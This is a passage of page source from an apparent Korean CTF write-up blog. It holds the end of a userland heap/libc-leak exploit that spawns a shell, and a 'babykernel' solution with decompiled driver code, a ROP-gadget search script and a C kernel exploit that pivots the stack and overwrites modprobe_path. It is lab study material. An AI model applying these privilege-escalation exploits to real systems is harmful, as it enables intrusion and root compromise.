0xc004, 0xc004, 0xc004, 0xd508, 0xd508, 0xd508, 0xd508, 0xd508, 0xd508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc004, 0xc004,0xc004, 0xc004, 0xc004, 0xc004, 0xd608, 0xd608, 0xd608, 0xd608, 0xd608, 0xd608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc004, 0xc004, 0xc004, 0xc004, 0x0002,0x0000, 0x0000,0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000,0x0000, 0x0000,0x0000,0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000,0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0020, 0x0000,0x0000,0x0000,0x0000,0x0000,0x0028,0x0000,0x0043,0x0000, 0x0029,0x0000, 0x0000, 0x0000,0x0000, 0x0000, 0x003c, 0x0000,0x003c,0x0000, 0x0000,0x0000,0x0000,0x0000, 0x002d, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000,0x0028,0x0000,0x0052, 0x0000, 0x0029, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0075, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x002c, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x003e, 0x0000, 0x003e, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0020, 0x0000, 0x0031, 0x0000, 0x002f, 0x0000, 0x0034, 0x0000, 0x0020, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0020, 0x0000, 0x0031, 0x0000, 0x002f, 0x0000, 0x0032, 0x0000, 0x0020, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0020, 0x0000, 0x0033, 0x0000, 0x002f, 0x0000, 0x0034, 0x0000, 0x0020, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0041, 0x0000, 0x0045, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0078, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0073, 0x0000, 0x0073, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0061, 0x0000, 0x0065, 0x0000, ] def unctrl_sp_emu(x): global ctype_loc word_29780 = [0, 3, 2, 3, 4, 3, 6, 3, 8, 3, 10, 3, 12, 3, 14, 3, 16, 3, 18, 3, 20, 3, 22, 3, 24, 3, 26, 3, 28, 3, 30, 3, 32, 3, 34, 3, 36, 3, 38, 3, 40, 3, 42, 3, 44, 3, 46, 3, 48, 3, 50, 3, 52, 3, 54, 3, 56, 3, 58, 3, 60, 3, 62, 3, 64, 3, 66, 3, 68, 3, 70, 3, 72, 3, 74, 3, 76, 3, 78, 3, 80, 3, 82, 3, 84, 3, 86, 3, 88, 3, 90, 3, 92, 3, 94, 3, 96, 3, 98, 3, 100, 3, 102, 3, 104, 3, 106, 3, 108, 3, 110, 3, 112, 3, 114, 3, 116, 3, 118, 3, 120, 3, 122, 3, 124, 3, 126, 3, 128, 3, 130, 3, 132, 3, 134, 3, 136, 3, 138, 3, 140, 3, 142, 3, 144, 3, 146, 3, 148, 3, 150, 3, 152, 3, 154, 3, 156, 3, 158, 3, 160, 3, 162, 3, 164, 3, 166, 3, 168, 3, 170, 3, 172, 3, 174, 3, 176, 3, 178, 3, 180, 3, 182, 3, 184, 3, 186, 3, 188, 3, 190, 3, 192, 3, 194, 3, 196, 3, 198, 3, 200, 3, 202, 3, 204, 3, 206, 3, 208, 3, 210, 3, 212, 3, 214, 3, 216, 3, 218, 3, 220, 3, 222, 3, 224, 3, 226, 3, 228, 3, 230, 3, 232, 3, 234, 3, 236, 3, 238, 3, 240, 3, 242, 3, 244, 3, 246, 3, 248, 3, 250, 3, 252, 3, 254, 3] unk_29360 = [94, 64, 0, 94, 65, 0, 94, 66, 0, 94, 67, 0, 94, 68, 0, 94, 69, 0, 94, 70, 0, 94, 71, 0, 94, 72, 0, 94, 73, 0, 94, 74, 0, 94, 75, 0, 94, 76, 0, 94, 77, 0, 94, 78, 0, 94, 79, 0, 94, 80, 0, 94, 81, 0, 94, 82, 0, 94, 83, 0, 94, 84, 0, 94, 85, 0, 94, 86, 0, 94, 87, 0, 94, 88, 0, 94, 89, 0, 94, 90, 0, 94, 91, 0, 94, 92, 0, 94, 93, 0, 94, 94, 0, 94, 95, 0, 32, 0, 33, 0, 34, 0, 35, 0, 36, 0, 37, 0, 38, 0, 39, 0, 40, 0, 41, 0, 42, 0, 43, 0, 44, 0, 45, 0, 46, 0, 47, 0, 48, 0, 49, 0, 50, 0, 51, 0, 52, 0, 53, 0, 54, 0, 55, 0, 56, 0, 57, 0, 58, 0, 59, 0, 60, 0, 61, 0, 62, 0, 63, 0, 64, 0, 65, 0, 66, 0, 67, 0, 68, 0, 69, 0, 70, 0, 71, 0, 72, 0, 73, 0, 74, 0, 75, 0, 76, 0, 77, 0, 78, 0, 79, 0, 80, 0, 81, 0, 82, 0, 83, 0, 84, 0, 85, 0, 86, 0, 87, 0, 88, 0, 89, 0, 90, 0, 91, 0, 92, 0, 93, 0, 94, 0, 95, 0, 96, 0, 97, 0, 98, 0, 99, 0, 100, 0, 101, 0, 102, 0, 103, 0, 104, 0, 105, 0, 106, 0, 107, 0, 108, 0, 109, 0, 110, 0, 111, 0, 112, 0, 113, 0, 114, 0, 115, 0, 116, 0, 117, 0, 118, 0, 119, 0, 120, 0, 121, 0, 122, 0, 123, 0, 124, 0, 125, 0, 126, 0, 94, 63, 0, 126, 64, 0, 126, 65, 0, 126, 66, 0, 126, 67, 0, 126, 68, 0, 126, 69, 0, 126, 70, 0, 126, 71, 0, 126, 72, 0, 126, 73, 0, 126, 74, 0, 126, 75, 0, 126, 76, 0, 126, 77, 0, 126, 78, 0, 126, 79, 0, 126, 80, 0, 126, 81, 0, 126, 82, 0, 126, 83, 0, 126, 84, 0, 126, 85, 0, 126, 86, 0, 126, 87, 0, 126, 88, 0, 126, 89, 0, 126, 90, 0, 126, 91, 0, 126, 92, 0, 126, 93, 0, 126, 94, 0, 126, 95, 0, 77, 45, 32, 0, 77, 45, 33, 0, 77, 45, 34, 0, 77, 45, 35, 0, 77, 45, 36, 0, 77, 45, 37, 0, 77, 45, 38, 0, 77, 45, 39, 0, 77, 45, 40, 0, 77, 45, 41, 0, 77, 45, 42, 0, 77, 45, 43, 0, 77, 45, 44, 0, 77, 45, 45, 0, 77, 45, 46, 0, 77, 45, 47, 0, 77, 45, 48, 0, 77, 45, 49, 0, 77, 45, 50, 0, 77, 45, 51, 0, 77, 45, 52, 0, 77, 45, 53, 0, 77, 45, 54, 0, 77, 45, 55, 0, 77, 45, 56, 0, 77, 45, 57, 0, 77, 45, 58, 0, 77, 45, 59, 0, 77, 45, 60, 0, 77, 45, 61, 0, 77, 45, 62, 0, 77, 45, 63, 0, 77, 45, 64, 0, 77, 45, 65, 0, 77, 45, 66, 0, 77, 45, 67, 0, 77, 45, 68, 0, 77, 45, 69, 0, 77, 45, 70, 0, 77, 45, 71, 0, 77, 45, 72, 0, 77, 45, 73, 0, 77, 45, 74, 0, 77, 45, 75, 0, 77, 45, 76, 0, 77, 45, 77, 0, 77, 45, 78, 0, 77, 45, 79, 0, 77, 45, 80, 0, 77, 45, 81, 0, 77, 45, 82, 0, 77, 45, 83, 0, 77, 45, 84, 0, 77, 45, 85, 0, 77, 45, 86, 0, 77, 45, 87, 0, 77, 45, 88, 0, 77, 45, 89, 0, 77, 45, 90, 0, 77, 45, 91, 0, 77, 45, 92, 0, 77, 45, 93, 0, 77, 45, 94, 0, 77, 45, 95, 0, 77, 45, 96, 0, 77, 45, 97, 0, 77, 45, 98, 0, 77, 45, 99, 0, 77, 45, 100, 0, 77, 45, 101, 0, 77, 45, 102, 0, 77, 45, 103, 0, 77, 45, 104, 0, 77, 45, 105, 0, 77, 45, 106, 0, 77, 45, 107, 0, 77, 45, 108, 0, 77, 45, 109, 0, 77, 45, 110, 0, 77, 45, 111, 0, 77, 45, 112, 0, 77, 45, 113, 0, 77, 45, 114, 0, 77, 45, 115, 0, 77, 45, 116, 0, 77, 45, 117, 0, 77, 45, 118, 0, 77, 45, 119, 0, 77, 45, 120, 0, 77, 45, 121, 0, 77, 45, 122, 0, 77, 45, 123, 0, 77, 45, 124, 0, 77, 45, 125, 0, 77, 45, 126, 0, 126, 63, 0, 128, 0, 129, 0, 130, 0, 131, 0, 132, 0, 133, 0, 134, 0, 135, 0, 136, 0, 137, 0, 138, 0, 139, 0, 140, 0, 141, 0, 142, 0, 143, 0, 144, 0, 145, 0, 146, 0, 147, 0, 148, 0, 149, 0, 150, 0, 151, 0, 152, 0, 153, 0, 154, 0, 155, 0, 156, 0, 157, 0, 158, 0, 159, 0, 160, 0, 161, 0, 162, 0, 163, 0, 164, 0, 165, 0, 166, 0, 167, 0, 168, 0, 169, 0, 170, 0, 171, 0, 172, 0, 173, 0, 174, 0, 175, 0, 176, 0, 177, 0, 178, 0, 179, 0, 180, 0, 181, 0, 182, 0, 183, 0, 184, 0, 185, 0, 186, 0, 187, 0, 188, 0, 189, 0, 190, 0, 191, 0, 192, 0, 193, 0, 194, 0, 195, 0, 196, 0, 197, 0, 198, 0, 199, 0, 200, 0, 201, 0, 202, 0, 203, 0, 204, 0, 205, 0, 206, 0, 207, 0, 208, 0, 209, 0, 210, 0, 211, 0, 212, 0, 213, 0, 214, 0, 215, 0, 216, 0, 217, 0, 218, 0, 219, 0, 220, 0, 221, 0, 222, 0, 223, 0, 224, 0, 225, 0, 226, 0, 227, 0, 228, 0, 229, 0, 230, 0, 231, 0, 232, 0, 233, 0, 234, 0, 235, 0, 236, 0, 237, 0, 238, 0, 239, 0, 240, 0, 241, 0, 242, 0, 243, 0, 244, 0, 245, 0, 246, 0, 247, 0, 248, 0, 249, 0, 250, 0, 251, 0, 252, 0, 253, 0, 254, 0, 255, 0] word_29160 = [0, 0, 3, 0, 6, 0, 9, 0, 12, 0, 15, 0, 18, 0, 21, 0, 24, 0, 27, 0, 30, 0, 33, 0, 36, 0, 39, 0, 42, 0, 45, 0, 48, 0, 51, 0, 54, 0, 57, 0, 60, 0, 63, 0, 66, 0, 69, 0, 72, 0, 75, 0, 78, 0, 81, 0, 84, 0, 87, 0, 90, 0, 93, 0, 96, 0, 98, 0, 100, 0, 102, 0, 104, 0, 106, 0, 108, 0, 110, 0, 112, 0, 114, 0, 116, 0, 118, 0, 120, 0, 122, 0, 124, 0, 126, 0, 128, 0, 130, 0, 132, 0, 134, 0, 136, 0, 138, 0, 140, 0, 142, 0, 144, 0, 146, 0, 148, 0, 150, 0, 152, 0, 154, 0, 156, 0, 158, 0, 160, 0, 162, 0, 164, 0, 166, 0, 168, 0, 170, 0, 172, 0, 174, 0, 176, 0, 178, 0, 180, 0, 182, 0, 184, 0, 186, 0, 188, 0, 190, 0, 192, 0, 194, 0, 196, 0, 198, 0, 200, 0, 202, 0, 204, 0, 206, 0, 208, 0, 210, 0, 212, 0, 214, 0, 216, 0, 218, 0, 220, 0, 222, 0, 224, 0, 226, 0, 228, 0, 230, 0, 232, 0, 234, 0, 236, 0, 238, 0, 240, 0, 242, 0, 244, 0, 246, 0, 248, 0, 250, 0, 252, 0, 254, 0, 0, 1, 2, 1, 4, 1, 6, 1, 8, 1, 10, 1, 12, 1, 14, 1, 16, 1, 18, 1, 20, 1, 22, 1, 24, 1, 26, 1, 28, 1, 30, 1, 33, 1, 36, 1, 39, 1, 42, 1, 45, 1, 48, 1, 51, 1, 54, 1, 57, 1, 60, 1, 63, 1, 66, 1, 69, 1, 72, 1, 75, 1, 78, 1, 81, 1, 84, 1, 87, 1, 90, 1, 93, 1, 96, 1, 99, 1, 102, 1, 105, 1, 108, 1, 111, 1, 114, 1, 117, 1, 120, 1, 123, 1, 126, 1, 129, 1, 133, 1, 137, 1, 141, 1, 145, 1, 149, 1, 153, 1, 157, 1, 161, 1, 165, 1, 169, 1, 173, 1, 177, 1, 181, 1, 185, 1, 189, 1, 193, 1, 197, 1, 201, 1, 205, 1, 209, 1, 213, 1, 217, 1, 221, 1, 225, 1, 229, 1, 233, 1, 237, 1, 241, 1, 245, 1, 249, 1, 253, 1, 1, 2, 5, 2, 9, 2, 13, 2, 17, 2, 21, 2, 25, 2, 29, 2, 33, 2, 37, 2, 41, 2, 45, 2, 49, 2, 53, 2, 57, 2, 61, 2, 65, 2, 69, 2, 73, 2, 77, 2, 81, 2, 85, 2, 89, 2, 93, 2, 97, 2, 101, 2, 105, 2, 109, 2, 113, 2, 117, 2, 121, 2, 125, 2, 129, 2, 133, 2, 137, 2, 141, 2, 145, 2, 149, 2, 153, 2, 157, 2, 161, 2, 165, 2, 169, 2, 173, 2, 177, 2, 181, 2, 185, 2, 189, 2, 193, 2, 197, 2, 201, 2, 205, 2, 209, 2, 213, 2, 217, 2, 221, 2, 225, 2, 229, 2, 233, 2, 237, 2, 241, 2, 245, 2, 249, 2, 253, 2] for i in range(len(word_29160)//2): word_29160[i] = u16(bytes(word_29160[i*2:i*2+2])) word_29160 = word_29160[:len(word_29160)//2+1] for i in range(len(word_29780)//2): word_29780[i] = u16(bytes(word_29780[i*2:i*2+2])) word_29780 = word_29780[:len(word_29780)//2+1] if (x-0xa0)\u00260xffffffff \u003c= 0x5f: v = [] for i in range(4): if unk_29360[word_29780[x-0x80\u00260xffffffff]+i] == 0: break v.append(unk_29360[word_29780[x-0x80\u00260xffffffff]+i]) return bytes(v) else: v = [] for i in range(4): if unk_29360[word_29160[x]+i] == 0: break v.append((unk_29360[word_29160[x]+i])) return bytes(v) def leak_bytes(raw_bytes : bytes, k : bytes, l : int) -\u003e bytes: def parse(res, raw,l,idx,candidates): print(res) if len(res) \u003e l: return None elif len(res) == l: return bytes(res) else: f = 0 for i in range(0x0,0x20): if raw[idx+len(res):idx+len(res)+2] == unctrl_sp_emu(i): res.append(i) v = (parse(res,raw,l,idx+1,candidates)) f = 1 if v != None: candidates.append(v) res.pop() for i in range(0x20,0x7f): if p8(raw[idx+len(res)]) == unctrl_sp_emu(i): res.append(i) v = (parse(res,raw,l,idx,candidates)) f = 1 if v != None: candidates.append(v) res.pop() for i in range(0x7f,0xa0): if raw[idx+len(res):idx+len(res)+2] == unctrl_sp_emu(i): res.append(i) v = (parse(res,raw,l,idx+1,candidates)) f = 1 if v != None: candidates.append(v) res.pop() for i in range(0xa0,0x100): if (raw[idx+len(res)]) == (i): res.append(i) v = (parse(res,raw,l,idx,candidates)) f = 1 if v != None: candidates.append(v) res.pop() if f==0: return None candidates = [] idx = raw_bytes.index(k) res = [] parse(res, raw_bytes, l, idx+len(k),candidates) return candidates # pwndbg\u003e source ./addrsearch.py # addr : 0x55ad1bc7f6c0 # target addr start: 0x7f12897b8000 # target addr end : 0x7f1289765000 # # 0x55ad1bc7f6c0 | 0x7f12897b9ce0 -- offset : -0xe720 # 0x55ad1bc7f6c8 | 0x7f12897b9cf0 -- offset : -0xe718 # 0x55ad1bc7f6d0 | 0x7f12897b9d00 -- offset : -0xe710 # 0x55ad1bc7f6d8 | 0x7f12897b9d10 -- offset : -0xe708 # 0x55ad1bc7f6e0 | 0x7f12897b9d20 -- offset : -0xe700 # 0x55ad1bc7f808 | 0x7f128978bb20 -- offset : -0xe5d8 # 0x55ad1bc7f8f0 | 0x7f12897c4b50 -- offset : -0xe4f0 # 0x55ad1bc7f8f8 | 0x7f12897b9d50 -- offset : -0xe4e8 # 0x55ad1bc800f8 | 0x7f1289765680 -- offset : -0xdce8 # 0x55ad1bc80168 | 0x7f12897615e0 -- offset : -0xdc78 # 0x55ad1bc80260 | 0x7f12897610a0 -- offset : -0xdb80 # 0x55ad1bc8e9b0 | 0x7f1289764cc0 -- offset : 0xbd0 # 0x55ad1bc8e9b8 | 0x7f1289764cc0 -- offset : 0xbd8 # 0x55ad1bc8e9b8 | 0x7f1289764cc0 -- offset : 0xbd8 if __name__ == '__main__': for i in range(5): print(solve(i+1)) rvuntil(b'Result') s(b'\\xe0') rv = rvuntil(b'1.') addr = leak_bytes(rv,b'1. ',6) heap = 0 for i in addr: v = u64(i + b'\\x00'*2) if (v \u003e\u003e 8*5) == 0x55 or (v \u003e\u003e 8*5) == 0x56: if heap == 0: heap = v assert(heap != 0) success(\"heap : \" + hex(heap)) s(b'y') for i in range(5): print(solve(i+1),'solved') rvuntil(b'Result') # constraint # addr-0x10+0x28 -\u003e 0 # 0x55ad1bc7f6d8 | 0x7f12897b9d10 -- offset : -0xe708 s(b'A'*0x18 + p64(heap-0xe708-0x10)) rv = rvuntil(b'3. ') addr = (leak_bytes(rv,b'3. ',6)) libc_base = 0 for i in addr: v = u64(i + b'\\x00'*2) if (v \u003e\u003e 8*5) == 0x7f: if libc_base == 0: libc_base = v assert(libc_base != 0) libc_base -= 0x24bd10 success(\"libc_base : \" + hex(libc_base)) s(b'y') for i in range(5): print(solve(i+1),'solved') rvuntil(b'Result') s(b'/bin/sh\\x00' + b'A'*0x10 + p64(libc_base + 0x1f6080-0x10)) s(b'n') sl(b'3') s(p64(libc_base + libc.sym.system)) pause() p.interactive() babykernel 궁금해서 문제 파일을 받아서 풀어봤다.\nAnalysis local_run.sh #!/bin/sh qemu-system-x86_64 \\ -m 128M \\ -cpu kvm64,+smep \\ -kernel bzImage \\ -initrd rootfs.img.gz \\ -snapshot \\ -nographic \\ -monitor /dev/null \\ -no-reboot \\ -append \"console=ttyS0 kaslr kpti=1 quiet panic=1\" \\ -s smap가 안걸려있다.\nbabykernel.ko copy_from_user(\u0026user_struct, args, 0x18LL); switch ( (_DWORD)cmd ) { case 0x1002: v5 = (char *)\u0026ops + 8 * *(\u0026user_struct + 2); v6 = (_QWORD *)kmem_cache_alloc_trace(kmalloc_caches[18], 0x6000C0LL, 16LL); *v6 = v5; if ( (unsigned __int64)*(\u0026user_struct + 1) \u003e 0x10 ) _copy_overflow(16LL, *(\u0026user_struct + 1)); else copy_to_user(user_struct, v6); break; case 0x1003: ((void (*)(void))((char *)\u0026ops + 8 * *(\u0026user_struct + 2)))();// relative ex break; case 0x1001: v4 = (_QWORD *)kmem_cache_alloc_trace(kmalloc_caches[18], 0x6000C0LL, 0x10LL); *v4 = \u0026commit_creds; if ( (unsigned __int64)*(\u0026user_struct + 1) \u003c= 0x10 ) copy_to_user(user_struct, v4); break; } return 1LL; } 0x1002, 0x1001은 릭해주고, 0x1003은 ops에서 특정 오프셋만큼 떨어진 부분을 실행한다.\nExploitation ops쪽이랑 코드쪽 매핑을 릭하고 피보팅해주고 modprobe_path를 덮었다. bzImage를 vmlinux로 추출하려했는데, 안되길래 직접 rop gadgets을 찾는 스크립트를 작성해서 가젯을 잘 가져왔다.\nimport gdb from capstone import * from tqdm import tqdm import pickle default = \"../res.rop\" def brief(x,keywords): m = 0x7ffffffff M = -1 Ml = 0 for i in keywords: if m \u003e x.index(i): m = x.index(i) if M \u003c x.index(i): M = x.index(i) Ml = len(i) if m == -1 or M == -1: return None s,S = 0,0 if M+Ml+1 \u003e len(x): S = 1 if m-21 \u003c 0: s = 1 if s and not S: return x[:M+Ml+1] elif not s and S: i = m while True: if x[i] == '\\n': i+=1 break i-=1 return x[i:] elif not s and not S: i = m while True: if x[i] == '\\n': i+=1 break i-=1 return x[i:M+Ml+1] else: return x def parse_int(v): if v.startswith(\"0x\"): v = int(v,16) else: v = int(v,10) return v def search(s,sv): if sv: print(\"save? (y/n) : \",end='') v = input() == 'y' if v: with open(default,\"wb\") as f: pickle.dump(s, f) print(\"saved\") print() print(\"Examples)\\n\\t1) array search :\\n\\t\\tSearch \u003e ['xchg','esp','ret']\\n\\t2) string search :\\n\\t\\tSearch \u003e xchg esp\\n\\t3) quit :\\n\\t\\tSearch \u003e q\\n\\t4) Save results :\\n\\t\\tSearch \u003e save\") print() while True: print(\"Search \u003e \",end='') v = input() if v == 'q': break elif v.startswith('['): print(\"limit : \",end='') limit = parse_int(input()) arr = eval(v) res = [] for i in s: f = 0 cur = -1 idx = [] for j in arr: if j not in i: f = 1 break else: if cur \u003c i.index(j): idx.append(i.index(j)) cur = i.index(j) else: f = 1 if f==0: m = sum(idx) / len(idx) M = 0 t = 0 for k in idx: t = (m - k)**2 if M \u003c t: M = t res.append([t,i]) print(\"show brief (y/n) : \",end= '') v = input() == 'y' res.sort() if len(res) \u003c limit: limit = len(res) for i in range(limit): if v: print() x= brief((res[i][1]),arr) if x == None: continue print(x) else: print() print((res[i][1])) else: print(\"limit : \",end='') limit = parse_int(input()) for i in s: if v in i: print(i) if __name__ == '__main__': print(\"load? (y/n) : \",end='') v = input() == 'y' if v: try: s = '' with open(default,'rb') as f: s = pickle.load(f) print(\"loaded successfully\") search(s,False) except FileNotFoundError: print(f\"'{default}' not found\") else: inf = gdb.inferiors()[0] print(\"segment address : \",end='') addr = parse_int(input()) res = gdb.execute(f\"xinfo {addr}\",to_string=True) if 'Containing mapping:' in res: res = res[res.index('0x')+2:] res = res[res.index('0x'):].split() print(f\"reading memory {res[0]} ~ {res[1]} (0x{res[3]} bytes)\") mem = (inf.read_memory(int(res[0],16),int(res[3],16))).tobytes() md = Cs(CS_ARCH_X86, CS_MODE_64) #gadgets = [b'\\xc3',b\"\\xc2\",b'\\xcb',b\"\\xca\",b'\\xf2\\xc3',b\"\\xf2\\xc2\",b'\\xff',b'\\xeb',b'\\xe9',b'\\xf2\\xff',b'\\xcd\\x80',b\"\\x0f\\x34\",b\"\\x0f\\x05\",b'\\x65\\xff\\x15\\x10\\x00\\x00\\x00'] gadgets = [b'\\xc3',b\"\\xc2\",b'\\xcb',b\"\\xca\",b'\\xff',b'\\xeb',b'\\xe9',b'\\xf2',b'\\xcd',b'\\x0f',b'\\x65',b'\\x48'] # iretq candi = [] print(\"finding gadgets\") for i in tqdm(range(len(mem))): for k in gadgets: if mem[i] == k[0] and i not in candi: candi.append(i) s = [] base = int(res[0],16) # print(\"width : \",end='') # v = parse_int(input()) v = 0x20 # width 0x20 by default print(\"disassembling\") for j in tqdm(range(len(candi))): tmp = '' if j-v \u003c 0: for i in md.disasm(mem[:candi[j]+v], base): tmp += (\"%s:\\t%s %s\\n\" %('0x'+hex(i.address).replace('0x','').zfill(16) + ' (+'+ hex(i.address-base)+')', i.mnemonic, i.op_str)) else: for i in md.disasm(mem[candi[j]-v:candi[j]+v], base+candi[j]-v): tmp += (\"%s:\\t%s %s\\n\" %('0x'+hex(i.address).replace('0x','').zfill(16) + ' (+'+ hex(i.address-base)+')', i.mnemonic, i.op_str)) s.append(tmp) search(s,True) else: print(\"not mapped\") Exploit script #include #include #include #include #include #include #include #include #define LEAK 0x1001 #define EXEC 0x1003 #define READ 0x1002 // -no-pie struct ioinfo { uint8_t * buf; uint64_t size; uint64_t off; }; uint64_t user_cs, user_rflags, user_ss,user_rsp; void shell(void){ system(\"echo '#!/bin/sh\\nchmod 777 /flag' \u003e /tmp/x\"); system(\"chmod +x /tmp/x\"); system(\"echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' \u003e /tmp/v\"); system(\"chmod +x /tmp/v\"); system(\"/tmp/v\"); system(\"cat /flag\"); exit(0); } void save_state(){ __asm__ __volatile__ ( \".intel_syntax noprefix;\" \"mov user_cs, cs;\" \"pushf;\" \"pop user_rflags;\" \"mov user_rsp, rsp;\" \"mov user_ss, ss;\" \".att_syntax;\" ); } int main(){ int fd = open(\"/dev/babykernel\",O_RDONLY); if (fd == -1) return -1; struct ioinfo info; save_state(); info.buf = (uint8_t *)malloc(0x10); info.size = 0x8; ioctl(fd, LEAK, \u0026info); uint64_t commit_creds = *(uint64_t *)info.buf; info.off = 0x0; ioctl(fd, READ, \u0026info); uint64_t ops = *(uint64_t *)info.buf; printf(\"commit_creds : 0x%lx\\nops : 0x%lx\\n\",commit_creds,ops); free(info.buf); uint64_t base = commit_creds \u00260xfffffffffff00000; uint64_t xchg_esp = base + 0x605240; // pwndbg\u003e x/10xi 0xffffffff89205240 // 0xffffffff89205240: xchg esp,eax // 0xffffffff89205241: ret info.off = (xchg_esp - ops) / 8; uint64_t * stack = mmap((void *)((xchg_esp \u0026 0xffff0000)-0x5000), 0x10000,7,MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,-1,0); uint64_t * stack1 = mmap((void *)((xchg_esp \u0026 0xffff0000)), 0x10000,7,MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,-1,0); // merge mem if (!stack) exit(-1); printf(\"fake_stack : %p\\n\",stack); uint64_t st = (xchg_esp \u0026 0xffffffff); *((uint64_t *)(st + 0x00)) = base + 0x8197fd; *((uint64_t *)(st + 0x08)) = base + 0x1a8b340; *((uint64_t *)(st + 0x10)) = base + 0x44b12; *((uint64_t *)(st + 0x18)) = ((xchg_esp \u0026 0xffffffff) + 0x500); *((uint64_t *)(st + 0x20)) = base + 0x1c4203; *((uint64_t *)(st + 0x28)) = 0x1; *((uint64_t *)(st + 0x30)) = base + 0x72b6f7; // rep movsq qword ptr [rdi], qword ptr [rsi] *((uint64_t *)(st + 0x38)) = base + 0x1001144; *((uint64_t *)(st + 0x40)) = 0x0; *((uint64_t *)(st + 0x48)) = 0x0; *((uint64_t *)(st + 0x50)) = (uint64_t)\u0026shell; *((uint64_t *)(st + 0x58)) = user_cs; *((uint64_t *)(st + 0x60)) = user_rflags; *((uint64_t *)(st + 0x68)) = user_rsp; *((uint64_t *)(st + 0x70)) = user_ss; *(uint64_t *)((xchg_esp \u0026 0xffffffff) + 0x500) = 0x782f706d742f; ioctl(fd, EXEC, \u0026info); return 0; } ",
  "wordCount" : "6233",
  "inLanguage": "en",
  "datePublished": "2023-06-10T00:00:00Z",
  "dateModified": "2023-06-10T00:00:00Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://msh1307.kr/blog/cce_2023_junior_quals/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "msh1307",
    "logo": {
      "@type": "ImageObject",
      "url": "https://msh1307.kr/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header sticky-header">
    
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BR89V2WEC0"></script>
    <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'G-BR89V2WEC0');
    </script>
    <nav class="nav">
        <div class="logo">
            <a href="https://msh1307.kr" accesskey="h" title="msh1307 (Alt + H)">msh1307</a>
            <span class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </span>
        </div>
        <ul id="menu">
            <li>
                <a href="https://msh1307.kr/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/blog" title="Blog">
                    <span>Blog</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/about" title="About">
                    <span>About</span>
                </a>
            </li>
